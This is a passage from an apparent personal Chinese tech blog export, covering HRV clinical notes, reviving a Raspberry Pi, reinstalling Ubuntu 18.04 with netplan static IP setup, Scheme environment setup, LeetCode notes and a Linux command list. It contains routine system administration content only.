<p>分析HRT通常需要24小时HRV动态心电图，主要有震荡初始(turbulence onset, TO)和震荡斜率(turbulence slope, TS)两个指标。</p>
<h2 id="临床价值和应用">临床价值和应用</h2>
<h3 id="心肌梗死死亡率预测">心肌梗死死亡率预测</h3>
<p>心梗后早期(14日内)，若检测到患者的HRV指标降低，则心梗后3年内的死亡风险增至3-4倍。</p>
<h3 id="心力衰竭">心力衰竭</h3>
<p>已知就预后而言，HRV降低是总体死亡、心力衰竭死亡、心脏性猝死、室性心律失常和心脏移植的 独立预测指标</p>
<h3 id="评估自主神经病变">评估自主神经病变</h3>
<p>HRV明显降低或缺失可以作为辅助指标。</p>
<h3 id="冠心病">冠心病</h3>
<p>冠心病患者的HRV显著降低,且与冠状动脉病变支数及狭窄程度呈负相关,但与冠状动脉病变部位无关。</p>
<h3 id="检测精神压力">检测精神压力</h3>
<p>短时HRV变化可用于辅助检测精神压力</p>
<p>迷走神经的冲动传导频率受呼吸频率和深度的调节而呈现节律性波动，呼吸性窦性心律不齐(respiratory sinus arrhythmia, RSA)。在有节奏的呼吸或冥想时，RSA可被放大。</p>
<h3 id="评估体育表现">评估体育表现</h3>
<p>可以作为推测无氧阈的较为精确的指标之一</p>
<blockquote>
<p>注意 在运动评估中一般只有要求无伤等才会首先考虑HRV，一般是用血清肌酸激酶(CK)、血清睾酮(T)、血红蛋白、乳酸等</p>
</blockquote>
<h3 id="监测训练负荷及诊断运动性疲劳">监测训练负荷及诊断运动性疲劳</h3>
<p>交感一副交感神经张力的平衡会随着运动强度的改变而波</p>
<h3 id="运动康复医学领域">运动康复医学领域</h3>
<p>用于自主神经功能改善的评估</p>
<h3 id="睡眠分期">睡眠分期</h3>
<p>略</p>
<h2 id="其他">其他</h2>
<h3 id="呼吸和心率变异性">呼吸和心率变异性</h3>
<h4 id="bcg信号中的呼吸信息">BCG信号中的呼吸信息</h4>
<p>在采集到的BCG信号中，会包含呼吸信息，提取心率变异性通常要去除呼吸的干扰。</p>
<p>但是在一些利用HRV进一步分析情绪、压力、睡眠分期的时候，可以考虑保留部分呼吸特征并将呼吸特征纳入到检测和分类中，有时可以提高检测的准确率。</p>
<p>在心率变异性分析中纳入呼吸频率信息以进行压力评估</p>
<h4 id="呼吸变异性">呼吸变异性</h4>
<p>呼吸频率变异性(Respiratory Rate Variability，RRV, 有的地方也叫Breath Rate Variability），和心率变异性一样反映了一些生理特征，但是这种非电信号采集难，噪声大，不规律，包含的信息也比心电和脉搏波等信号少。除了</p>
<p>目前对于RRV的研究比较少，也很少有人用这个特征做睡眠分期检测、疲劳压力检测或睡眠呼吸暂停的检测。一些使用雷达等手段检测疲劳或者睡眠的研究将这项指标作为判断依据。雷达和监控视频等可以在较近的距离探测人体呼吸活动和心率，但是这样采集分离出的心动信息用作睡眠和疲劳监测不如直接采集呼吸和运动的信息进行分析。对于体重指数（body mass index ）过高的的超重人群、较复杂的干扰和活动等情景，使用雷达等方式检测压力或疲劳时HRV准确率大幅降低，从心动信息检测不如直接从呼吸信息检测。在这些场景下会使用呼吸和体动信息来作为指标。</p>
<h2 id="数据和软件">数据和软件</h2>
<ol type="1">
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cua3ViaW9zLmNvbS9ocnYtc3RhbmRhcmQv">https://www.kubios.com/hrv-standard/<i class="fa fa-external-link-alt"></i></span> 免费的HRV分析软件</li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cucGh5c2lvbmV0Lm9yZy8jbGF0ZXN0">https://www.physionet.org/#latest<i class="fa fa-external-link-alt"></i></span> 心电图数据</li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1EX0tZdjdwWEF2UQ==">https://www.youtube.com/watch?v=D_KYv7pXAvQ<i class="fa fa-external-link-alt"></i></span> rPPG检测心率</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9weXBpLm9yZy9wcm9qZWN0L2JvYi5ycHBnLmJhc2Uv">https://pypi.org/project/bob.rppg.base/<i class="fa fa-external-link-alt"></i></span> rPPG的开源库，数据集MAHNOB-HCI和DEAP</li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuaHJ2NHRyYWluaW5nLmNvbS8=">https://www.hrv4training.com/<i class="fa fa-external-link-alt"></i></span> 一个用蓝牙测HRV的APP，准确率貌似还可以</li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuZmlyc3RiZWF0LmNvbS9lbi9maXJzdGJlYXQtaHJ2LXN1bW1pdC0yMDE5Lw==">Firstbeat HRV Summit<i class="fa fa-external-link-alt"></i></span> Firstbeat公司的HRV峰会，一些商用搞的比较好的东西</li>
</ol>
]]></content>
      <categories>
        <category>102网吧日常</category>
      </categories>
      <tags>
        <tag>HRV</tag>
        <tag>BCG</tag>
      </tags>
  </entry>
  <entry>
    <title>试图抢救吃灰的树莓派</title>
    <url>/7042/</url>
    <content><![CDATA[<p><span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -1.602ex" xmlns="http://www.w3.org/2000/svg" width="2.127ex" height="4.638ex" role="img" focusable="false" viewBox="0 -1342 940 2050"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mfrac"><g data-mml-node="mn" transform="translate(220, 676)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mn" transform="translate(220, -686)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g><rect width="700" height="60" x="120" y="220"></rect></g></g></g></svg></mjx-container></span></p>
<p>自从来到沙河102网吧，都是在工作站/服务器/台式机上折腾，树莓派一直仍在清水河宿舍吃灰。今天回了趟清水河，把树莓派拿回来，试试能不能用，打算做备用测试机了。 <a id="more"></a> ## 装系统</p>
<p>从官网下载<a href="#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a>, 我下的Raspbian Buster（SD卡就只有16G，不打算搞那些recommend software了），解压之后已经是3.56G了</p>
<p>然后用Rufus烧进SD卡（很多教程全是推荐Win32Diskimager，那个并没有Rufus好用），只选第一行的目标设备和第二行引导镜像，其他默认（卡里之前有东西的话还是用SD Formatter先刷一遍）</p>
<p>2020.3 更新</p>
<p>貌似树莓派官方出了一个写入SD卡的<span class="exturl" data-url="aHR0cHM6Ly93d3cucmFzcGJlcnJ5cGkub3JnL2Jsb2cvcmFzcGJlcnJ5LXBpLWltYWdlci1pbWFnaW5nLXV0aWxpdHkv">工具<i class="fa fa-external-link-alt"></i></span>，可以去试试</p>
<p>然后将SD卡查到卡槽里，再把显示器接上（我工位上的ROC显示器有HDMI接口和电源, 终于不用无显示器安装拿个笔记本上来就SSH折腾了）</p>
<p>不行，搜了一下看到config.txt文件里有</p>
<pre class="line-numbers language-none"><code class="language-none"># uncomment to force a specific HDMI mode (this will force VGA)
#hdmi_group=1
#hdmi_mode=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>要把模式改一下啊</p>
<pre class="line-numbers language-none"><code class="language-none">hdmi_group=2
hdmi_mode=58<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>这样感觉还是不方便，还要占掉我一个大屏。改回了SSH连接的方式</p>
<p>在boot目录新建SSH文件夹，然后新建一个wpa_supplicant.conf的文件配置WIFI</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json">country=CN
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev
update_config=<span class="token number">1</span>

network=<span class="token punctuation">{</span>
    ssid=<span class="token string">"你的WIFI名"</span>
    psk=<span class="token string">"你的密码"</span>
    key_mgmt=WPA-PSK
    priority=<span class="token number">1</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后路由器找到ip，SSH连就行了，默认账号pi password：raspberry</p>
<p>发现这个树莓派真的鸡肋啊，扔着吃灰又可惜，不折腾硬件和IO不在乎功耗又不如有1080的工作站和20核CPU的服务器好（而且这俩还有公网IP和端口）</p>
<p>算了，每次折腾完了就后悔。 本逃兵不打算折腾硬件了，从医疗测控电路到stm32到树莓派的IO，都不太想碰了。时代变了，七八十年代的硅谷才是搞硬件的地方，二十一世纪是...反正不是硬件狗的世纪。251牢厂、加班狂魔联影、毁约的迈瑞，只想让人看了跑路。。。</p>
<p>服务器，启动。树莓派，关机。</p>
<h2 id="注">注</h2>
<section class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn1" role="doc-endnote"><p>http://downloads.raspberrypi.org/<a href="#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>
]]></content>
      <categories>
        <category>荒废的老本行</category>
      </categories>
      <tags>
        <tag>树莓派3B+</tag>
      </tags>
  </entry>
  <entry>
    <title>给服务器重装Ubuntu</title>
    <url>/2d5/</url>
    <content><![CDATA[<p><img width=100 src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/haixing.png" alt="Picture"/> 祖传服务器传到了我的手里 <a id="more"></a> 上回书说到，服务器一不小心卸载了iptables 现在准备重装。还是打算装Ubuntu Server（并不打算装Manjaro，也不适合搞桌面版，今天试过一下Ubuntu Desktop，图形化界面由于服务器没有独显直接卡到爆炸） <del>初步打算安装Ubuntu server 16.04.6LTS, 使用LVM分区</del> 安装Ubuntu18.04LTS，之前VPS用过一阵18，也没注意有什么新特性，据说还是改了一些东西⬇</p>
<blockquote>
<p>据说 内核更新到了 Linux kernel 4.15，这就意味着新增了不少特性 bbr什么的 网络管理工具 ifupdown 已经彻底废弃，建议全面拥抱 ip 命令 DNS 由 systemd 全面接管，接口监听在 127.0.0.53:53，配置文件在 /etc/systemd/resolved.conf，修改后重启服务即可 systemctl restart systemd-resolved。不要听网上那些奇怪的教程教你如何修改 /etc/resolv.conf swap 文件来替代 swap 分区</p>
</blockquote>
<h2 id="装ubuntu16.04lts">装Ubuntu16.04LTS</h2>
<h3 id="安装">安装</h3>
<p>下载iso，制作启动盘，这里用的Rufus <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/rufus.png" alt="Picture" style="zoom:80%;" /></p>
<p>然后直接装，网卡直接自动识别了，配置也没什么好说的，可以参考这里<a href="#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a>或这里<a href="#fn2" class="footnote-ref" id="fnref2" role="doc-noteref"><sup>2</sup></a>,</p>
<h3 id="后续配置">后续配置</h3>
<p>进去之后换你电镜像源（终端里vim改/etc/apt/sources.list） apt包update&amp;&amp;upgrade 修改时区和系统时间 安装Docker，照着官方教程装Docker的时候根本下载不动,换了个国内的源 桌面不打算装gnome或者kde了，Mobaxterm用X11一般就够了</p>
<h2 id="重新安装ubuntu18.04-lts">重新安装Ubuntu18.04 LTS</h2>
<p>由于某些原因，决定还是换18</p>
<h2 id="再次安装">再次安装</h2>
<p>UEFI启动 create bond这里先不配置了（只有一张网卡eno1），bound mode选默认的balance-rr eno1网卡选择automatic自动获取ipv4和ipv6 镜像源这里输入你电的 选use the entire disk and set up LVM <del>是否安装openssh，空格选安装，选择从GitHub获取</del> 然后输入你的用户名(先准备好key，当然这个时候要保证网也是通的) 这里勾选openssh之后一直报错，可能是网的问题，不勾选，等后面再装 分区就分一个/boot，一个/swap，一个/home <!-- 
（当然你要先准备好key，先用git bash生成key
`ssh-keygen -t rsa -C 'your_email@example.com'`
再到Github的SSH设置里面把公钥填进去（id_rsa.pub里面的内容）
然后测试一下是否成功
<img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/ssh-github.png" alt="Picture" style="zoom:80%;" />
） --></p>
<p>然后是漫长的installing kernal （不知道为什么装server比desktop版慢那么多）</p>
<p>bbr已经自带了，不用装了 设置root用户和用户组权限 装Docker参考这里<a href="#fn3" class="footnote-ref" id="fnref3" role="doc-noteref"><sup>3</sup></a> 和英文官方教程那个差不多，主要是获取GPG的地址和Docker源换成国内的 换成国内中科大的镜像源（这个换了也时断时续可能连不上） 出现permission denied：</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">Got permission denied while trying to connect to the Docker daemon socket at unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;docker.sock: Get http:&#x2F;&#x2F;%2Fvar%2Frun%2Fdocker.sock&#x2F;v1.40&#x2F;containers&#x2F;json: dial unix &#x2F;var&#x2F;run&#x2F;docker.sock: connect: permission denied<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>是权限的问题，要加当前用户到用户组里面</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gpasswd -a <span class="token variable">$&#123;<span class="token environment constant">USER</span>&#125;</span> docker<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="更改静态为ip">更改静态为ip</h3>
<p>网卡是eno1（服务器就一个网卡） Ubuntu18的配置改了，在<code>/etc/netplan/50-cloud-init.yaml</code>, 现在18使用netplan管理网络 配置文件是yaml格式，跟hexo和next主题的配置文件格式一样</p>
<pre class="line-numbers language-yml" data-language="yml"><code class="language-yml"># network: &#123;config: disabled&#125;
network:
    ethernets:
        eno1:
            dhcp4: true
    version: 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>改成</p>
<pre class="line-numbers language-yml" data-language="yml"><code class="language-yml">network:
  version: 2
  renderer: networkd
  ethernets:
    eno1:   #配置的网卡名称
#      dhcp4: true    #dhcp4关闭
#      dhcp6: true    #dhcp6关闭
      addresses: [211.83.111.224&#x2F;23]   #设置本机IP及掩码
      gateway4: 211.83.110.1   #设置网关
      nameservers:
          addresses: [114.114.114.114, 8.8.8.8]   #设置DNS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>(网关地址用<code>route -n</code>查看，配置参考<span class="exturl" data-url="aHR0cDovL2Jsb2cuc2luYS5jb20uY24vcy9ibG9nXzUzNzNiY2Y0MDEwMnhrNWcuaHRtbA==">ubuntu 18.04 netplan yaml配置固定IP地址<i class="fa fa-external-link-alt"></i></span>)</p>
<p>然后</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> netplan apply<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>不对啊，又炸了，ipv4的网关到底是啥啊</p>
<p>看了一下官网<a href="#fn4" class="footnote-ref" id="fnref4" role="doc-noteref"><sup>4</sup></a>，好像nameserver和gateway4都是可选项，可以空着默认 直接改成这样试试</p>
<pre class="line-numbers language-yml" data-language="yml"><code class="language-yml">network:
  version: 2
#  renderer: networkd
  ethernets:
    eno1:
      addresses: [211.83.111.224&#x2F;23]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后进/run/systemd/network看一下系统的网络配置文件</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /run/systemd/network`
<span class="token function">ls</span>
<span class="token function">cat</span> *<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>下面这样应该就可以了，吧.....？</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">root@xi102server:&#x2F;run&#x2F;systemd&#x2F;network# cat 10-netplan-eno1.network
[Match]
Name&#x3D;eno1

[Network]
LinkLocalAddressing&#x3D;ipv6
Address&#x3D;211.83.111.224&#x2F;23<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>行吧，搜出一堆东西都不靠谱，还是得看官网</p>
<h3 id="感想">感想</h3>
<p>服务器启动的声音真的大啊 一半以上的问题都是网络问题，校内这个网真的.... 靠镜像源救回半条狗命</p>
<p>Ubuntu18安装时配置网卡时想选静态ip选择Manual进去填写subnet, 结果那个subnet选项是<code>XXX.XXX.XXX.XXX/XX</code> 看了教研室其他设备相同频段的子网掩码是<code>255.255.254.0</code>，但是填了不行，用网上计算子网掩码的工具算了一下，就是<code>255.255.254.0</code></p>
<p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/netmmask.png" alt="Picture" style="zoom:80%;" /></p>
<p>暂时选了DHCP直接配置网卡，等进去再指定静态ip<a href="#fn5" class="footnote-ref" id="fnref5" role="doc-noteref"><sup>5</sup></a></p>
<p>哦，netplan好像把子网掩码的格式改了 原来是这样 &gt;address = 192.168.225.50 netmask = 255.255.255.0</p>
<p>改成了这种格式 &gt;addresses : [192.168.225.50/24]</p>
<p>滚去补习计网知识了</p>
<h2 id="安装参考">安装参考</h2>
<p>223.5.5.5 223.6.6.6</p>
<section class="footnotes" role="doc-endnotes">
<hr />
<ol>
<li id="fn1" role="doc-endnote"><p><span class="exturl" data-url="dHRwczovL3R1dG9yaWFscy51YnVudHUuY29tL3R1dG9yaWFsL3R1dG9yaWFsLWluc3RhbGwtdWJ1bnR1LXNlcnZlcg==">tutorial-install-ubuntu-server<i class="fa fa-external-link-alt"></i></span><a href="#fnref1" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn2" role="doc-endnote"><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLjUxY3RvLmNvbS8zMjQxNzY2LzIzMjM5Mjc=">Ubuntu16.04.5以lvm方式安装全记录<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0xWTV8o566A5L2T5Lit5paHKQ==">LVM arch-wiki<i class="fa fa-external-link-alt"></i></span><a href="#fnref2" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn3" role="doc-endnote"><p><span class="exturl" data-url="aHR0cHM6Ly95ZWFzeS5naXRib29rcy5pby9kb2NrZXJfcHJhY3RpY2UvaW5zdGFsbC91YnVudHUuaHRtbA==">Ubuntu 安装 Docker CE<i class="fa fa-external-link-alt"></i></span>、<span class="exturl" data-url="aHR0cHM6Ly95ZWFzeS5naXRib29rcy5pby9kb2NrZXJfcHJhY3RpY2UvaW5zdGFsbC9taXJyb3IuaHRtbA==">镜像加速器<i class="fa fa-external-link-alt"></i></span><a href="#fnref3" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn4" role="doc-endnote"><p><span class="exturl" data-url="aHR0cHM6Ly9uZXRwbGFuLmlvL2V4YW1wbGVz">netplan官网的配置示例<i class="fa fa-external-link-alt"></i></span><a href="#fnref4" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
<li id="fn5" role="doc-endnote"><p><span class="exturl" data-url="aHR0cHM6Ly93d3cudGVjbWludC5jb20vY29uZmlndXJlLW5ldHdvcmstc3RhdGljLWlwLWFkZHJlc3MtaW4tdWJ1bnR1Lw==">How to Configure Network Static IP Address in Ubuntu 18.04<i class="fa fa-external-link-alt"></i></span><a href="#fnref5" class="footnote-back" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>
]]></content>
      <categories>
        <category>102网吧日常</category>
      </categories>
      <tags>
        <tag>ubuntu</tag>
        <tag>装机</tag>
      </tags>
  </entry>
  <entry>
    <title>λ演算&amp;函数式编程</title>
    <url>/a10f/</url>
    <content><![CDATA[<p>等待填坑 <a id="more"></a> ## 摸鱼一时爽</p>
<p>函数式编程(Functional Programming)好像比面向对象抽象程度更高。但是之前折腾硬件的时候都没有用到过，可能是不太适合处理IO接口和操作时序吧。 之前在图书馆乱翻，看到一本七周七语言的书，翻到函数式，感觉还挺有意思，教研室的摸鱼生活就搞点这个吧，反正干正事是不可能干正事的 <del>正在进JavaScript的坑，将就着用js来练练手吧。</del> javascript味不对，还是直接上了Lisp</p>
<h2 id="λ演算λ-calculus">λ演算(λ-calculus)</h2>
<ul>
<li>是匿名的</li>
<li>只有一个输入</li>
</ul>
<p>多输入的函数要转成多个只有一个输入的函数的嵌套调用，也就是柯里化（currying）</p>
<p><span class="math inline">\(\lambda\)</span>项</p>
<h2 id="附">附</h2>
<h3 id="环境配置">环境配置</h3>
<p>Arch下安装mit-sheme包就好了，SICP的练习环境。这个操作基本跟Emacs差不多，是SICP的作业环境。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yay -S mit-scheme<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>不过我用的是这个Chez Scheme，前几年开源了的东西，速度很快</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yay -S chez-scheme<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>运行直接</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">scheme <span class="token operator">&lt;</span> test.scm<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>就好了</p>
<p>我不习惯Emacs的快捷键，都是在vscode里写的，装一个vscode-scheme插件就好了。可以在code runner插件里配置一下，然后按快捷键运行</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"code-runner.executorMap"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token property">".scm"</span><span class="token operator">:</span> <span class="token string">"scheme &lt; "</span><span class="token punctuation">,</span>
    <span class="token property">"scheme"</span><span class="token operator">:</span> <span class="token string">"scheme &lt; "</span><span class="token punctuation">,</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>详见 https://github.com/cisco/ChezScheme</p>
]]></content>
      <categories>
        <category>不务正业系列</category>
      </categories>
      <tags>
        <tag>λ-calcus</tag>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode刷题</title>
    <url>/6aa3/</url>
    <content><![CDATA[<p>我就每天当瓜子嗑了，不刷题练练手真的要成一个废人了 <a id="more"></a></p>
<p>生活所迫，开始刷题练手</p>
<p>装上了VSCode，开始在教研室摸鱼式刷题，再次感受到了VSCode本质上是一个浏览器。</p>
<p>现在还有点纠结拿什么语言刷，哎，不行就先把那本算法竞赛入门经典刷一遍吧。大一学的数据结构都快忘光了。(⊙﹏⊙)</p>
<h2 id="vscode-remotedevelopment插件连接wsl">VSCode RemoteDevelopment插件连接wsl</h2>
<p>教研室分给我的坑位上那台即将报废回收破主机是个14年的i5，并没有独显，虚拟机和双系统是跑不太动了，而且我想用Docker，打开hyper-v之后VMware也不兼容，就弃坑VM了。 开始想在win10下装clang和gcc，后来发现用VSCode直接上wsl更省事，安装Remote Development插件就行了 在wsl新建目录输入<code>code-insiders .</code>或者<code>code .</code> 或者在VSCode里按F1，选择<code>Remote-WSL: New Window</code>，再打开文件夹就行了，看到左下角有个绿色的wsl标志就可以了 git还会有点小问题，要禁用换行符自动转换，不然win下面和linux下面不一样每次git的repo明明没改动，却显示新的变化，问题看<span class="exturl" data-url="aHR0cHM6Ly9jb2RlLnZpc3VhbHN0dWRpby5jb20vZG9jcy9yZW1vdGUvd3Ns">这里<i class="fa fa-external-link-alt"></i></span></p>
<pre class="line-numbers language-git" data-language="git"><code class="language-git">git config --global core.autocrlf false<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>wsl的Debian应该是buster版本的，镜像源选buster（Debian10）</p>
<p>wsl里cd进<code>\mnt</code>目录就能和win10交换文件，win10下的wsl文件目录在<code>C:\Users\Username\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs</code></p>
<p>wsl里的shell换成oh my zsh，哎，舒服 配置问题请参考<span class="exturl" data-url="aHR0cHM6Ly9jb2RlLnZpc3VhbHN0dWRpby5jb20vZG9jcy9jcHAvY29uZmlnLXdzbA==">官方文档<i class="fa fa-external-link-alt"></i></span>，可以装code runner插件像IDE一样直接运行 <span class="exturl" data-url="aHR0cHM6Ly9wcmludGVtcHcuZ2l0aHViLmlvL3ZzY29kZS1jLWNwcC1jb25maWd1cmF0aW9uLWZvci1hY20tb2ov">看这里<i class="fa fa-external-link-alt"></i></span> 更新，由于巨硬的VSCode频繁更新，json配置格式乱改，折腾来折腾去非常麻烦，请直接使用别人打包好的便携版或者直接转投Clion（有教育邮箱的我就转投Clion了，JB全家桶真香） 据说wsl2已经在20H1预览版上了，但是win10这个样子我又不敢乱更新，等等看吧，观望一下再决定黑巨硬还是微软真香。</p>
<h2 id="leetcode">leetcode</h2>
<p>看了一下leetcode对语言的支持 C++：g++ 8.2，C++14 标准，C：gcc 8.2</p>
<p>[69] sqrt(x)</p>
<p>二分法或者牛顿法</p>
<p>[231] Power of Two</p>
<p>不断除以二就行了，或者按位与</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">num <span class="token operator">&amp;</span> <span class="token punctuation">(</span>num<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>[193] Valid Phone Numbers 美国地区电话号码，直接用正则就好了<code>^(\d&#123;3&#125;-|\(\d&#123;3&#125;\) )\d&#123;3&#125;-\d&#123;4&#125;$</code></p>
<h2 id="其他">其他</h2>
<p>努力不写不求甚解的谭++ &gt;有一些很简单的鉴别方法 比如创建obj用的Type()而不是Type{}, 到处是类型声明, 各种子类继承叠罗汉 都是谭++的标志</p>
<h3 id="alloca和malloc函数">alloca和malloc函数</h3>
<p>C/C++里面的alloca函数动态分配内存, 从栈申请内存，自动释放。alloca是最快的动态内存分配，对应的汇编只有一条指令 sub rsp, size。 C还支持可变长数组（variable-length array， VLA）（C99以后） malloc从堆中申请内存，需要手动释放（free）</p>
<h3 id="c和stl">C++和STL</h3>
<p>等待填坑</p>
]]></content>
      <categories>
        <category>杂七杂八</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux从入门到入土</title>
    <url>/193/</url>
    <content><![CDATA[<p>从小心翼翼到灵车漂移</p>
<a id="more"></a>
<h2 id="写在前面的话">写在前面的话</h2>
<p>刚刚入坑Linux的时候我还迷信UINX哲学，看到别人在那<span class="exturl" data-url="aHR0cHM6Ly9zdWNrbGVzcy5vcmcvc3Vja3Mvc3lzdGVtZC8=">骂systemd<i class="fa fa-external-link-alt"></i></span>还有好有道理的样子。后来发现什么Keep it stupid Simple、去中心化在很多场景有很大的缺陷，还是systemd真香啊。linux桌面日用至今只是勉强能用的样子，wayland还是有好多软件和组件不配适，xorg又各种撕裂，不少国产软件能出个win版都烧高香了，软件生态也看不到多少希望。linux发行版本来就分裂，然后DE也五花八门，然后各种控件和面板都可以自行美化魔改，根本不可能稳定。目前比较喜欢的桌面是KDE，长期看好，虽然还是跟瘟斗士和Bug Sir差了很多。linux桌面绑一块都打不过MAC，甚至连Chrome OS都不一定能打过，还各种内斗和搞分裂。软件生态也是个无解的问题，建议大家要用各种办公软件和仿真设计软件的还是去用win和mac，不要来受这个罪。</p>
<h2 id="常用shell命令">常用Shell命令</h2>
<h3 id="系统状态">系统状态</h3>
<table>
<thead>
<tr class="header">
<th>Command</th>
<th>Function</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>reboot</td>
<td>重启</td>
</tr>
<tr class="even">
<td>poweroff</td>
<td>关机</td>
</tr>
<tr class="odd">
<td>wget</td>
<td>下载文件</td>
</tr>
<tr class="even">
<td>ps</td>
<td>监视进程</td>
</tr>
<tr class="odd">
<td>top</td>
<td>动态监视进程</td>
</tr>
<tr class="even">
<td>kill</td>
<td>终止进程</td>
</tr>
<tr class="odd">
<td>free</td>
<td>查看内存</td>
</tr>
<tr class="even">
<td>history</td>
<td>查看历史命令</td>
</tr>
</tbody>
</table>
<p>这里推荐用glances代替top，<code>pip3 install glances</code></p>
<h3 id="文件操作">文件操作</h3>
<p>cd, ls, mkdir, ls, mv， rm这些不说了</p>
<table>
<thead>
<tr class="header">
<th>Command</th>
<th>Function</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>pwd</td>
<td>查看当前目录</td>
</tr>
<tr class="even">
<td>stat</td>
<td>查看文件信息</td>
</tr>
<tr class="odd">
<td>diff</td>
<td>比较差异</td>
</tr>
<tr class="even">
<td>touch</td>
<td>创建空白文件</td>
</tr>
<tr class="odd">
<td>tar</td>
<td>打包文件</td>
</tr>
</tbody>
</table>
<p>tar -c 创建压缩， -x 解压缩(-xvzf) 如：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">tar</span> -czvf filemane.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>查看目录下文件大小（包括文件夹）</p>
